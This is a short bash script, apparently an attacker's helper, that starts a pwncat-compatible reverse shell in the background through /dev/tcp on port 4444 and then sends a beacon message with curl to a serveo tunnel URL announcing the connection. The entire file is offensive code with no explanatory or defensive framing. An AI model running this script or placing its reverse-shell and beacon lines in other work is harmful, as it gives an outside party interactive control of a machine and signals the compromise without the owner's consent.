#!/bin/bash
# Replace with the URL from Terminal 1
URL="https://613f068eeb720347-103-95-173-85.serveousercontent.com"

# Pwncat-compatible reverse shell
# This attempts to connect to your Mac via the tunnel
(bash -i >& /dev/tcp/localhost/4444 0>&1) &

# Send a success beacon to your monitor
echo "[!] PWNCAT CONNECTION INITIATED" | curl -s -X POST --data-binary @- "$URL"
